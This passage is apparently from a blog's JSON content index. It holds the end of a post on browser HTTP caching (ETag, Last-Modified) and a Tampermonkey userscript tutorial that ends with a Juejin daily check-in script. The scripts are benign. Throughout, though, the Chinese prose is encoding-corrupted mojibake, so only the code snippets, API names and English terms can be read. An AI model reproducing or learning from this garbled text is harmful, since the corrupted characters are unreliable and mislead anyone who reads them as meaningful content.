ç‚ºå¦‚æœè³‡æ–™æœ‰è®Šï¼Œå‰‡ ETag æœƒè·Ÿè‘—è®Š)ï¼›é€™æ™‚åªéœ€ç”¨å‚³å€‹ 304 Not Modified çµ¦å‰ç«¯ï¼Œç€è¦½å™¨æ”¶åˆ° 304 å¾Œï¼Œå°±çŸ¥é“è³‡æ–™æ²’è®Šï¼Œæ‰€ä»¥å¯ä»¥ç¹¼çºŒç”¨ cache çš„ã€‚\nè€Œå¦‚æœå¾Œç«¯æ¯”è¼ƒäº† ETag ç™¼ç¾æ”¹è®Šï¼Œé‚£å°±ä¸æ˜¯å›å‚³ 304ï¼Œè€Œæ˜¯å›å‚³ä¸€åŒ…æ–°çš„è³‡æ–™ã€‚\nLast-Modified (æ­é… If-Modified-Since) ç¬¬äºŒå€‹æ–¹å¼å‰‡æ˜¯åœ¨ä¼ºæœå™¨çš„å›æ‡‰ header ä¸­åŠ å…¥ Last-Modifiedï¼Œä¸¦æ¨™æ³¨æœ€å¾Œä¿®æ”¹è©²è³‡æºçš„æ™‚é–“ï¼Œä¾‹å¦‚ Last-Modified: 2021-11-07 21:32:16ã€‚\nç•¶ç€è¦½å™¨æ”¶åˆ°å¸¶æœ‰ Last-Modified çš„å›æ‡‰å¾Œï¼Œä¹‹å¾Œçš„è«‹æ±‚å°±æœƒå¸¶ä¸Š If-Modified-Sinceï¼Œç„¶å¾Œå¸¶ä¸Šå…ˆå‰æ”¶åˆ°çš„æ™‚é–“ï¼Œä¾‹å¦‚ If-Modified-Since: 2021-11-07 21:32:16ã€‚ä¼ºæœå™¨æ”¶åˆ°å¸¶æœ‰ If-Modified-Since çš„è«‹æ±‚ï¼Œæ¯”å°äº†æ™‚é–“ï¼Œå¦‚æœæ›´æ–°è³‡æºçš„æ™‚é–“æ²’æœ‰è®Šï¼Œæ‹¿ä¸€æ¨£å¯ä»¥å›å‚³ 304 Not Modified çµ¦å‰ç«¯ï¼Œå¦‚æœè®Šäº†å‰‡å›å‚³ 200 ä»¥åŠæ–°çš„è³‡æ–™ã€‚\n","date":"2022-12-19T00:00:00Z","image":"https://live.staticflickr.com/65535/52571693467_4bcdc4d080_o.png","permalink":"https://wayneblog.ga/2022-12-19/browser-http-caching/","title":"é¢è©¦å¸¸è¦‹çš„ç€è¦½å™¨å•é¡Œ(ä¸€) - HTTP caching æ©Ÿåˆ¶"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\næ²¹çŒ´è…³æœ¬é‹è¡Œæ–¼æ²¹çŒ´æ’ä»¶ä¹‹ä¸Šï¼Œæ²¹çŒ´æ’ä»¶æœ¬è³ªä¸Šå°ç€è¦½å™¨èƒ½åŠ›çš„å†å°è£ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘å€‘å…ˆä¾†ç°¡å–®äº†è§£ä¸€ä¸‹ç€è¦½å™¨æ’ä»¶ã€‚\nç€è¦½å™¨æ’ä»¶(Browser Extension)ï¼šç€è¦½å™¨çš„æ“´å±•æ‡‰ç”¨ èªªçš„ç›´ç™½ä¸€é»ï¼Œå°±æ˜¯æ‹¿è‘—ç€è¦½å™¨é–‹æ”¾çš„èƒ½åŠ›(æ’ä»¶API)ï¼Œå»å¯¦ç¾ä¸€äº›å°å‹æ‡‰ç”¨ã€‚\nç€è¦½å™¨æ’ä»¶ä¸»è¦ç”±å››éƒ¨åˆ†æ§‹æˆï¼šbackground scriptsã€content scriptsã€å…¨å±€ UI å…ƒç´ ã€options pageã€‚\nbackground scrips: å¾Œå°è…³æœ¬ï¼Œä¸€å€‹å¾Œå°è…³æœ¬æ˜¯ä¸€å€‹ç¨ç«‹ç·šç¨‹ï¼Œæ˜¯æ¸¸é›¢æ–¼å„å€‹é é¢ä¹‹å¤–çš„\u0026quot;ä¸Šå¸ä¹‹çœ¼\u0026quot;ã€‚å…·æœ‰è¨ªå•å„é¡æ’ä»¶ API çš„èƒ½åŠ›ï¼Œä½†åŒæ™‚ä¹Ÿå–ªå¤±äº†ç›´æ¥æ“ä½œé é¢çš„èƒ½åŠ›ã€‚ content scriptsï¼šå…§å®¹è…³æœ¬ï¼Œå…·æœ‰ç›´æ¥æ“ä½œé é¢çš„èƒ½åŠ›ã€‚å…¶å¯¦å°±æ˜¯åœ¨é é¢ä¸­é‹è¡Œ js è…³æœ¬ï¼Œå¯ä»¥ä½¿ç”¨ DOM APIã€‚content script åªèƒ½ç›´æ¥è¨ªå•å°‘é‡æ’ä»¶ APIï¼Œä½†èƒ½å’Œ background script é€²è¡Œé›™å‘é€šä¿¡å®Œæˆæ•¸æ“šäº¤æ›ã€‚ å…¨å±€ UI å…ƒç´ ï¼šç€è¦½å™¨å±¤çš„UI äº¤äº’ï¼ŒåŒ…æ‹¬ï¼š åœ¨ Toolbar é¡¯ç¤º iconï¼Œå®šç¾©é»æ“Š icon å¾Œé¡¯ç¤ºçš„ Popup æˆ–å…¶ä»–æ•ˆæœ å¢åŠ å³éµé¸é … å¢åŠ å…¨å±€å¿«æ·éµ æ”¹é€ æ–°Tab é ã€æ­·å²è¨˜éŒ„é ã€æ›¸ç±¤é  options pageï¼šæ’ä»¶é…ç½®é ã€‚ ç€è¦½å™¨æ’ä»¶çš„æ ¸å¿ƒæ©Ÿåˆ¶å¯ä»¥ç”¨ä¸‹åœ–ç°¡å–®æ¦‚æ‹¬ï¼š\næƒ³å¿…ï¼Œå¤§å®¶æœ€å¥½å¥‡çš„é‚„æ˜¯æœ‰å“ªäº› API ä»¥åŠèƒ½ç”¨é€™äº› API åšä»€éº¼ï¼Œé€™è£¡ä¾‹èˆ‰å¹¾å€‹ï¼š\ncontextMenusï¼šå¢åŠ å³éµé¸é …ã€‚ ä½¿ç”¨é¸ä¸­æ–‡æœ¬ï¼Œä¾‹å¦‚ï¼šåŠƒè©ç¿»è­¯ã€æ–‡æœ¬æ”¶é›† å¿«é€Ÿèª¿ç”¨æ’ä»¶åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼šæ‰“é–‹ DevToolï¼Œé é¢å‰ªè— cookiesï¼šå¢åˆªæ”¹æŸ¥ cookie(ä»»æ„åŸŸå)ï¼Œç›´æ¥æ‹¿è‘—æœ¬åœ° cookie ç™¼é€è«‹æ±‚ï¼Œä¸å¿…å†åšæˆæ¬Šã€‚åŒæ™‚ç”±æ–¼å¾Œå°è…³æœ¬ä¸æ˜¯ Web é é¢ï¼Œåœ¨ç™¼é€è«‹æ±‚æ™‚æ²’æœ‰è·¨åŸŸé™åˆ¶ã€‚ å¤šå¹³å°ä¿¡æ¯èšåˆ å¤šå¹³å°ä¿¡æ¯åˆ†ç™¼ devtools.panelsï¼šå¢åŠ  Devtool é¢æ¿ï¼Œé€™å€‹å°å‰ç«¯é–‹ç™¼è€…ä¾†èªªæ‡‰è©²å¾ˆç†Ÿæ‚‰ï¼ŒReact Developer Toolsã€Vue.js devtoolsã€‚ notificationsï¼šç€è¦½å™¨é€šçŸ¥ï¼Œæœªæ‰“é–‹é é¢çš„æƒ…æ³ä¸‹é€²è¡Œé€šçŸ¥ï¼Œå¯ä»¥è¼”åŠ©ä¸€äº›å·¥å…·é¡æ‡‰ç”¨ã€‚ storageï¼šå…¨å±€ä¿å­˜æ•¸æ“šï¼Œå¯è·Ÿéš¨ç€è¦½å™¨å¸³æˆ¶åŒæ­¥ã€‚ é€™è£¡ä¾‹èˆ‰çš„åªæ˜¯æˆ‘å¸¸ç”¨çš„ä¸€äº›ï¼Œåªæ˜¯æ»„æµ·ä¸€ç²Ÿï¼Œæ›´å¤š API å¯ä»¥æŸ¥é–±ï¼š\nChrome Extension API Reference æ”¯æŒç”¨æ–¼æ“´å±•Microsoft Edge API Mozilla WebExtensions API ç€è¦½å™¨æ’ä»¶å°±ç°¡å–®ä»‹ç´¹åˆ°é€™è£¡ï¼Œå¦‚æœæœ‰èˆˆè¶£ç¹¼çºŒäº†è§£ï¼Œæ¨è–¦ï¼šChromeã€Edgeã€Mozillaä¸‰å®¶çš„æ–‡æª”ã€‚\næ²¹çŒ´æ’ä»¶(Tampermonkey) ç€è¦½å™¨æ’ä»¶å¯ä»¥å¯¦ç¾å„å¼å„æ¨£çš„åŠŸèƒ½ï¼Œä½†æœ‰æ™‚å€™é–‹ç™¼è€…åªæ˜¯æƒ³å°æŸä¸€å€‹ç«™é»åŠ ä¸€é»é»å°åŠŸèƒ½ï¼Œå¦‚æœé€™ä¹Ÿè¦æ§‹å»ºç’°å¢ƒæ‰“åŒ…ä¸Šæ¶åˆ†ç™¼ï¼Œæœªå…å°±å¤ªéº»ç…©äº†ä¸€äº›ï¼›å¾æ‡‰ç”¨å¸‚å ´è§’åº¦ä¾†çœ‹ï¼Œå……æ–¥è‘—é¡†ç²’åŒ–çš„æ‡‰ç”¨ï¼Œå¸‚å ´ä¹Ÿæœƒæ“æ“ ç¹é›œä¸å ªã€‚\næ²¹çŒ´æ’ä»¶ç‚ºè¼•é‡åŒ–è…³æœ¬æä¾›äº†ä¸€å€‹å¹³å°ï¼Œåœ¨ç·šç·¨è¼¯å™¨ä¸­ç·¨å¯«æ²¹çŒ´è…³æœ¬å³æ™‚ç”Ÿæ•ˆï¼Œé€šé Githubã€GreasyFork å¿«é€Ÿåˆ†ç™¼ã€‚\nåœ¨æ²¹çŒ´æ’ä»¶ä¸­ï¼Œcontent script èµ·åˆ°éå¸¸é‡è¦çš„è§’è‰²ï¼Œå®ƒå°‡ç”¨æˆ¶ç·¨å¯«çš„ä»£ç¢¼é‹è¡Œåœ¨é é¢ä¸­ï¼ŒåŒæ™‚æä¾› GM_xxxx å‡½æ•¸å°è£ç€è¦½å™¨çš„éƒ¨åˆ†èƒ½åŠ›ã€‚å°è£çš„å…§éƒ¨å¯¦ç¾æ˜¯å’Œ background script é€šä¿¡ï¼Œé©…å‹• background script èª¿ç”¨æ’ä»¶APIã€‚\nå°æ²¹çŒ´æ’ä»¶ç°¡å–®äº†è§£ä¹‹å¾Œï¼Œä¾†çœ‹çœ‹å¦‚ä½•ç·¨å¯«æ²¹çŒ´è…³æœ¬ã€‚\nTampermonkey API æ²¹çŒ´è…³æœ¬ç”±é ­éƒ¨å’Œæ ¸å¿ƒé‚è¼¯å…©éƒ¨åˆ†çµ„æˆã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // ==UserScript== // @name New Userscript // @namespace http://tampermonkey.net/ // @version 0.1 // @description try to take over the world! // @author You // @match https://www.tampermonkey.net/documentation.php?ext=dhdg // @icon https://www.google.com/s2/favicons?domain=tampermonkey.net // @grant none // ==/UserScript== (function() { \u0026#39;use strict\u0026#39;; // Your code here... })(); é ­éƒ¨ é ­éƒ¨æ˜¯è…³æœ¬çš„ä¸€äº›å…ƒä¿¡æ¯ã€æ›´æ–°æ–¹å¼ã€æŒ‡å®šé‹è¡Œé é¢ã€æ¬Šé™è²æ˜ï¼Œé€ä¸€è§£é‡‹ä¸€ä¸‹ï¼š\né…ç½®å ä½œç”¨ ä½¿ç”¨æŠ€å·§ @name è…³æœ¬é¡¯ç¤ºçš„åç¨± åŠ å¾Œç¶´å¯¦ç¾åœ‹éš›åŒ–ï¼Œä¾‹å¦‚ï¼š@name:zh-CN æŒ‡å®šåœ¨ç€è¦½å™¨èªè¨€ç‚ºä¸­æ–‡æ™‚é¡¯ç¤ºçš„åç¨± @namespace è…³æœ¬çš„å‘½åç©ºé–“ï¼Œå¯ä»¥ç†è§£ç‚ºè…³æœ¬çš„æ¨™è­˜ ç‚ºäº†é¿å…è¡çªä¸€èˆ¬ä½¿ç”¨ Github å€‰åº«åœ°å€ @version èˆ‡æ›´æ–°ç›¸é—œï¼Œç•¶å‰ç‰ˆæœ¬ @updateURL æª¢æŸ¥è…³æœ¬æ˜¯å¦æ›´æ–°åœ°å€ é…åˆ @version å’Œè‡ªå‹•æ›´æ–°ä½¿ç”¨ @downloadURL æª¢æ¸¬åˆ°æ›´æ–°æ™‚ï¼Œå»å“ªä¸‹è¼‰è…³æœ¬ @supportURL é‡åˆ°å•é¡Œæ™‚ï¼Œç”¨æˆ¶å»å“ªåé¥‹ @include è…³æœ¬åœ¨å“ªäº›é é¢é‹è¡Œ å¯ä½¿ç”¨æ­£å‰‡ï¼Œä¸æ”¯æŒ hashtagï¼Œå¤šå€‹é é¢çš„åœ°å€è²æ˜å¤šå€‹ @include å³å¯ @match èˆ‡ @include é¡ä¼¼ @exclude è…³æœ¬ç¦æ­¢åœ¨å“ªäº›é é¢é‹è¡Œï¼Œå„ªå…ˆæ–¼ @include @require åœ¨è…³æœ¬é‹è¡Œå‰å¼•å…¥å¤–éƒ¨ JavaScript æ–‡ä»¶ ä¾‹å¦‚ï¼šå¼•å…¥ jQuery @resource è²æ˜å¤–éƒ¨è³‡æºæ–‡ä»¶ï¼Œæ­é… GM_getResourceText ä½¿ç”¨ ä¾‹å¦‚ï¼šå¼•å…¥ htmlã€icon @connect è²æ˜ GM_xmlhttpRequest å¯è¨ªå•çš„åŸŸ å¿…é ˆæŒ‡å®šæ‰èƒ½æ­£å¸¸è«‹æ±‚ @grant è²æ˜ GM_xxx å‡½æ•¸çš„ä½¿ç”¨åˆ—è¡¨ å¿…é ˆå…ˆæŒ‡å®šæ¬Šé™æ‰èƒ½æ­£å¸¸ä½¿ç”¨ @run-at æŒ‡å®šè…³æœ¬é‹è¡Œæ™‚æ©Ÿ document-startï¼šç›¡å¿«åŸ·è¡Œdocument-bodyï¼šç•¶ body æ›è¼‰æ™‚åŸ·è¡Œdocument-endï¼šDOMContentLoaded è§¸ç™¼æ™‚åŸ·è¡Œdocument-idleï¼šDOMContentLoaded è§¸ç™¼å¾ŒåŸ·è¡Œï¼Œä¹Ÿæ˜¯é»˜èªè¨­ç½®é …context-menu: å³éµèœå–®é …è¢«é»æ“Šæ™‚åŸ·è¡Œ @author ä½œè€…å @description ç°¡çŸ­ä»‹ç´¹ åŒæ¨£å¯ä»¥åŠ å¾Œç¶´å¯¦ç¾åœ‹éš›åŒ–ï¼Œä¾‹å¦‚ï¼š@description:zh-CN @homepage ä¸»é åœ°å€ å¦‚æœæœªè¨­ç½®ä¸¦ä¸” @namespace æ˜¯å€‰åº«åœ°å€ï¼Œé»˜èªå°å‘å€‰åº«åœ°å€ @icon è…³æœ¬ icon @icon64 64x64 åƒç´ çš„è…³æœ¬ icon @antifeature è…³æœ¬æ˜¯å¦æœ‰å»£å‘Šã€æŒ–ç¤¦ã€æ•¸æ“šæ”¶é›†ç­‰å•†æ¥­è¡Œç‚º @noframes è²æ˜è…³æœ¬ä¸åœ¨ iframe ä¸­é‹è¡Œ æ ¸å¿ƒé‚è¼¯ æ ¸å¿ƒé‚è¼¯é€šéä¸€å€‹ç«‹å³åŸ·è¡Œå‡½æ•¸åŒ…è£¹ï¼Œé¿å…å’Œå…¨å±€ä½œç”¨åŸŸç›¸äº’å¹²æ“¾ã€‚Tampermonkey å°‡ç€è¦½å™¨çš„éƒ¨åˆ†èƒ½åŠ›å°è£ç‚º GM_XXX å‡½æ•¸ä»¥ä¾›èª¿ç”¨ï¼š\nAPI ä½œç”¨ ä½¿ç”¨æŠ€å·§ unsafeWindow è¨ªå•é é¢çš„ Window å°è±¡ GM_addStyle(css) å‰µå»ºå…¨å±€æ¨£å¼çš„å¿«æ·æ–¹å¼ï¼Œå‘é é¢æ’å…¥ style å…ƒç´  ä¹Ÿå¯ä»¥ç”¨ DOM æ“ä½œæ‰‹å‹•å‰µå»º GM_addElement(tag_name, attributes)GM_addElement(parent_node, tag_name, attributes) å‘ DOM æ–°å»ºå…ƒç´ çš„å¿«æ·æ–¹å¼ ä¹Ÿå¯ä»¥ç”¨ DOM æ“ä½œæ‰‹å‹•å‰µå»º GM_log(message) åœ¨ Console ä¸­æ‰“å°ä¿¡æ¯ console.log çš„å¿«æ·æ–¹å¼ GM_getValue(name, defaultValue) å¾å­˜å„²é«”ä¸­ç²å–æ•¸æ“š GM_deleteValue(name) å¾å­˜å„²é«”ä¸­åˆªé™¤æ•¸æ“š GM_listValues() åˆ—èˆ‰å­˜å„²é«”ä¸­æ‰€æœ‰æ•¸æ“šé … GM_addValueChangeListener ç›£è½æ•¸æ“šæ›´æ–° ä¾‹å¦‚è¦ä½¿ Tab é–“æ•¸æ“šåŒæ­¥ï¼Œå¯ä»¥ç”¨ç›£è½ value é”æˆåŒæ­¥ GM_removeValueChangeListener ç§»é™¤ç›£è½ GM_getResourceText(name) ç²å– @resource ä¸­å·²è²æ˜çš„è³‡æº GM_getResourceURL(name) ç²å– @resource ä¸­å·²è²æ˜çš„è³‡æº(base64 URI å½¢å¼) GM_registerMenuCommand(name, fn, accessKey) åœ¨ Tampermonkey çš„ popup ä¸­å¢åŠ é¸é … GM_unregisterMenuCommand(menuCmdId) ç§»é™¤é¸é … GM_openInTab(url, options) æ–°é–‹ä¸€å€‹ tab é  GM_xmlhttpRequest(details) ä½¿ç”¨å¾Œå°è…³æœ¬é€²è¡Œè«‹æ±‚ï¼Œè‡ªå‹•å¸¶ä¸Š cookieï¼Œç„¡è·¨åŸŸå•é¡Œï¼Œç›®æ¨™åŸŸéœ€è¦åœ¨ @connect ä¸­æå‰è²æ˜ GM_download(details) ä¸‹è¼‰è³‡æºåˆ°æœ¬åœ° GM_getTab(callback) ç²å–ç•¶å‰ tab çš„ object å°è±¡ GM_saveTab(tab) é€šé tab çš„ object å°è±¡é‡æ–°æ‰“é–‹ä¸€å€‹ tab GM_getTabs(callback) ç²å–ç•¶å‰å­˜æ´»çš„æ‰€æœ‰ tab çš„å°è±¡ï¼Œä»¥ä¾¿å’Œå…¶ä»–è…³æœ¬å¯¦ä¾‹æºé€š GM_notification ä½¿ç”¨æ’ä»¶ notification API å½ˆå‡ºæ¡Œé¢é€šçŸ¥ GM_setClipboard è¤‡è£½å…§å®¹åˆ°å‰ªè²¼æ¿ GM_info ç²å–è…³æœ¬çš„æ²¹çŒ´æ’ä»¶çš„ä¿¡æ¯ å®Œæ•´çš„èªªæ˜æ–‡æª”ï¼šTampermonkey documentation\nå¯¦è¸ï¼šæ‰“å° \u0026ldquo;Hello, World\u0026rdquo; åšä¸€å€‹éå¸¸ç°¡å–®çš„å°ç·´ç¿’ï¼šå‰µå»ºä¸€å€‹åç‚º \u0026ldquo;Hello\u0026rdquo; çš„è…³æœ¬ï¼Œç•¶é€²å…¥æ˜é‡‘å’ŒçŸ¥ä¹é é¢æ™‚ï¼Œåœ¨ Console ä¸­æ‰“å° \u0026ldquo;Hello, World\u0026rdquo;ã€‚\næ–°å»ºè…³æœ¬ ä¿®æ”¹è…³æœ¬åç¨± æŒ‡å®šé‹è¡Œåœ°å€ @match æˆ– @include ç›´æ¥ä½¿ç”¨ console.log æˆ–è€…è²æ˜æ¬Šé™èª¿ç”¨ GM_log 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // ==UserScript== // @name Hello // @namespace http://tampermonkey.net/hello // @version 0.1 // @description try to take over the world! // @author You Name // @match https://zhihu.com/* // @match https://juejin.cn/* // @grant GM_log // ==/UserScript== (function() { \u0026#39;use strict\u0026#39;; GM_log(\u0026#34;Hello World\u0026#34;); })(); æ­å»ºèˆ’é©çš„é–‹ç™¼ç’°å¢ƒ ä½¿ç”¨åœ¨ç·šç·¨è¼¯å™¨å°è©¦ç‰›åˆ€ä¹‹å¾Œï¼Œæˆ–è¨±ä½ ä¹Ÿç™¼ç¾åœ¨ç·šç·¨è¼¯å™¨ï¼š\nç¼ºå°‘èªæ³•è£œå…¨å’Œè‡ªå‹•æç¤º é›£ä»¥æ ¼å¼åŒ–ä»£ç¢¼ ä¸å…æ‡·å¿µèµ· VSCodeã€‚\næˆ–è¨±ä½ é‚„æœƒæœ‰æ›´æ·±é çš„è€ƒæ…®ï¼Œåœ¨ç·šç·¨è¼¯å™¨ç·¨è¼¯å®Œæˆå¾Œï¼š\næ€éº¼åŒæ­¥åˆ°é ç¨‹å€‰åº«ï¼Œæ€éº¼åšä»£ç¢¼åˆ†ç™¼ å¦‚æœè¦ç”¨åˆ°æ–°èªæ³•ï¼Œæ€éº¼ä¿è­‰è·¨ç€è¦½å™¨å…¼å®¹æ€§ å¦‚æœä»£ç¢¼è¶Šå¯«è¶Šå¤šï¼Œæ²’æœ‰æ¨¡å¡ŠåŒ–æ€éº¼ç®¡ç† æ²’æœ‰ TSï¼Œå¾ˆé›£ä¿è­‰é•·æœŸç¶­è­· é€™äº›å‘æˆ‘å·²ç¶“è¸©éäº†ï¼Œä¸¦ä¸”æŠ½å‡ºä¸€å€‹è…³æ‰‹æ¶å·¥å…· create-tampermonkey - npm (npmjs.com)ï¼Œä¸€éµæ­å»ºèˆ’é©çš„æ²¹çŒ´è…³æœ¬é–‹ç™¼ç’°å¢ƒã€‚\nè…³æ‰‹æ¶é›†æˆ rollup + babel + eslint + typescriptï¼Œæ”¯æŒï¼š\nè‡ªå‹•ç”Ÿæˆ UserScript Header èªæ³•å’Œé¡å‹ç³»çµ±ï¼šESNextã€ES Moduleã€TypeScript æ¨£å¼ç³»çµ±ï¼šCSS Modulesï¼Œä»¥åŠ scssã€sassã€lessã€stylus (éœ€å®‰è£å°æ‡‰ä¾è³´) éœæ…‹è³‡æºï¼šå°å…¥åœ–ç‰‡ã€SVG è½‰æ›ç‚º Base64ï¼ŒåŒæ™‚æ”¯æŒ SVG Sprite å¤šèªè¨€ æ“´å±•ï¼šåŸºæ–¼ Rollupï¼Œå¯ä»¥æŒ‰éœ€å®‰è£æ’ä»¶é€²è¡Œæ“´å±• create-tampermonkey å•Ÿå‹•é …ç›® åˆå§‹åŒ–é …ç›® 1 2 3 4 5 npx create-tampermonkey demo-userscript # æˆ–è€… npm init tampermonkey demo-userscript # æˆ–è€… yarn create tampermonkey demo-userscript åˆå§‹åŒ–å®Œç•¢å¾Œï¼Œé€²å…¥ç›®éŒ„å®‰è£ä¾è³´ã€‚ 1 npm run dev # è·‘èµ·é–‹ç™¼æ¨¡å¼ åˆ°ç€è¦½å™¨ä¸­æ‰“é–‹ dev.user.jsï¼Œè‡ªå‹•é€²å…¥ Tampermonkey è…³æœ¬å®‰è£ç•Œé¢ã€‚ æœ€å¾Œä¸€æ­¥ï¼šé…ç½®æ²¹çŒ´æ’ä»¶ è¨ªå• chrome://extensionï¼Œæ‰¾åˆ°æ²¹çŒ´æ’ä»¶çš„å¡ç‰‡ï¼Œé»æ“Š Details é€²å…¥é…ç½®ç•Œé¢ã€‚\nå‹¾é¸ Allow acess to file URLsã€‚\nåˆ·æ–°é é¢ï¼Œå‡ºç¾å½ˆçª—ï¼Œä¸€åˆ‡å°±ç·’ã€‚\nç”¨ VSCode æ‰“é–‹é …ç›®ï¼Œé€™æ™‚å³ä¸‹è§’æœƒæ¨è–¦ä¸€äº›è¼”åŠ©æ’ä»¶ï¼Œå»ºè­°å®‰è£ã€‚\nä»£ç¢¼ä¸­ä½¿ç”¨åˆ°çš„ GM_xxx æœƒè‡ªå‹•æå–åˆ° UserScript Header ä¸­ï¼Œç•¶ç„¶ä¹Ÿå¯ä»¥åœ¨ src/meta.json ä¸­è‡ªå®šç¾©ã€‚\nä»£ç¢¼çš„é»˜èªå…¥å£æ˜¯ src/main.js æ–‡ä»¶ã€‚\nå¯¦è¸ï¼šæ˜é‡‘ç°½åˆ°åŠŸèƒ½ åŸºæ–¼ä¸Šé¢åˆå§‹åŒ–çš„é …ç›® demo-userscript åšä¸€å€‹å°åŠŸèƒ½ï¼šæ˜é‡‘ç°½åˆ°åŠŸèƒ½ã€‚\nå®šä½è«‹æ±‚ \u0026ldquo;æ˜é‡‘ç°½åˆ°\u0026quot;æœ¬è³ªæ˜¯èª¿ç”¨æ¥å£ï¼Œæˆ‘å€‘çš„å¯¦ç¾æ€è·¯æ˜¯è¿½è¸ªé»æ“Š\u0026quot;ç«‹å³ç°½åˆ°\u0026quot;æŒ‰éˆ•æ™‚è«‹æ±‚ç™¼é€æƒ…æ³ï¼Œå®šä½åˆ°\nèª¿è©¦æ¥å£ æ‰“é–‹ Postman åšä¸€ä¸‹èª¿è©¦ï¼Œé€™è£¡æœ‰ä¸€å€‹å°å…¥å°æŠ€å·§ï¼šå³éµæ‹·è² cURLã€‚\nåˆ° Postman ä¸­é€šé curl å°å…¥æ•´å€‹è«‹æ±‚ï¼šé»æ“Šå·¦å´é¢æ¿ä¸­çš„ import æŒ‰éˆ•ï¼Œé¸æ“‡ Raw text è²¼ä¸Šä¸Šä¸€æ­¥è¤‡è£½çš„å…§å®¹å³å¯ã€‚\nç²å–åƒæ•¸ åœ¨ Postman ä¸­ç™¼ç¾è«‹æ±‚éœ€è¦ aidã€uuidã€_signature ä¸‰å€‹åƒæ•¸ï¼Œè©¦è©¦çœ‹ä¸å¸¶åƒæ•¸èƒ½å¦è«‹æ±‚æˆåŠŸï¼Œå…ˆç¢ºå®šå¥½å¿…ä¸å¯å°‘çš„åƒæ•¸å’Œè«‹æ±‚é ­ã€‚\nç°¡å–®å˜—è©¦å¾Œï¼Œç™¼ç¾é€™è£¡ä¸¦ä¸éœ€è¦å¸¶ aidã€uuidã€_signature ä¸‰å€‹åƒæ•¸ï¼Œä¸»è¦æ˜¯ä¾è³´ cookieï¼Œä½¿ç”¨ GM_xmlhttpRequest æœƒè‡ªå‹•å¸¶ä¸Šå°æ‡‰çš„ cookieï¼Œäº‹æƒ…è®Šå¾—ç°¡å–®ã€‚\nä¿®æ”¹ src/main.js çš„ä»£ç¢¼ï¼š\nsrc/main.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 GM_xmlhttpRequest({ url: \u0026#34;https://api.juejin.cn/growth_api/v1/check_in\u0026#34;, method: \u0026#34;POST\u0026#34;, headers: { \u0026#34;content-type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;user-agent\u0026#34;: navigator.userAgent, }, responseType: \u0026#34;json\u0026#34;, onload(response) { if (response.status === 200) { const data = response.response; if (data.data === \u0026#34;success\u0026#34;) { alert(\u0026#34;ç°½åˆ°æˆåŠŸ\u0026#34;); } else { alert(data.err_msg); } } }, }); åˆ·æ–°é é¢æ¸¬è©¦ä¸€ä¸‹ã€‚åœ¨å…¶ä»–ç«™é»åˆ·æ–°ä¸€ä¸‹å±…ç„¶ä¹Ÿå¯ä»¥ç™¼é€è«‹æ±‚ï¼Œé€™å°±æ˜¯æ’ä»¶æ²’æœ‰è·¨åŸŸé™åˆ¶çš„å„ªå‹¢äº†ã€‚\nå†åšä¸€ä¸‹ç¯€æµå„ªåŒ–ã€‚åˆ©ç”¨ GM_setValue å’Œ GM_getValue åšæŒçºŒå­˜å„²ã€‚\nsrc/main.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 const storageKey = \u0026#34;last_sign_timestamp\u0026#34;; // å–å¾—ä¸Šä¸€æ¬¡ç°½åˆ°çš„æ—¥å­ const lastSignNumberOfDays = GM_getValue(storageKey, 0); // è¨ˆç®—ç¾åœ¨æ‰€åœ¨çš„æ—¥å­ const currentNumberOfDays = Math.floor( new Date().valueOf() / 1000 / 60 / 60 / 24 ); // å¦‚æœä»Šå¤©å·²ç»è«‹æ±‚éï¼Œä¸å†è«‹æ±‚ if (currentNumberOfDays !== lastSignNumberOfDays) { GM_xmlhttpRequest({ url: \u0026#34;https://api.juejin.cn/growth_api/v1/check_in\u0026#34;, method: \u0026#34;POST\u0026#34;, headers: { \u0026#34;content-type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;user-agent\u0026#34;: navigator.userAgent, }, responseType: \u0026#34;json\u0026#34;, onload(response) { if (response.status === 200) { const data = response.response; if (data.data === \u0026#34;success\u0026#34;) { alert(\u0026#34;ç°½åˆ°æˆåŠŸ\u0026#34;); } else { alert(data.err_msg); } // æ›´æ–°æœ€è¿‘ä¸€æ¬¡ç°½åˆ°çš„æ—¥å­ GM_setValue(storageKey, currentNumberOfDays); } }, }); } é›£å…æœƒé‡åˆ°éœ€è¦ç²å–æ•¸æ“šçš„æƒ…æ³ï¼Œå¯è¨ªå•çš„æ•¸æ“šä¸€èˆ¬æœ‰ä¸‰ç¨®ï¼š\né é¢ä¸­åŒ…å«æ•¸æ“šï¼Œé€šéDOM ç²å– é€šéæ¥å£è«‹æ±‚å¾—åˆ° å­˜å„²åœ¨æœ¬åœ°å­˜å„²ä¸­ï¼ŒlocalStorage æˆ– cookie ä¹‹é¡ ç¢ºå®šæ–¹å¼å¾ˆç²—æš´ï¼š\nè¤‡è£½åƒæ•¸æˆ–åƒæ•¸å€¼åˆ°Element ä¸­æœç´¢ æŸ¥çœ‹å‰é¢å¹¾å€‹è«‹æ±‚ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰è·¡å¯å¾ª åˆ° localStorage æˆ– cookie ä¸­æœç´¢ ç™¼å¸ƒè…³æœ¬ åœ¨æœ¬åœ°é–‹ç™¼å®Œè…³æœ¬ä¹‹å¾Œï¼Œnpm run build æ§‹å»ºç”Ÿç”¢ç‰ˆæœ¬ä¸¦ä¸Šå‚³ä»£ç¢¼åˆ° Github æˆ– Giteeã€‚\nç”¨ Github/Gitee ä¸Šæ–‡ä»¶çš„ Raw URL å°±èƒ½ç›´æ¥å¯¦ç¾åˆ†ç™¼ã€‚å¦‚æœåœ¨ package.json ä¸­è¨­ç½®å¥½ repositoryï¼Œcreate-tampermonkey æœƒè‡ªå‹•ç”Ÿæˆ Raw URL ä¸¦è³¦çµ¦ 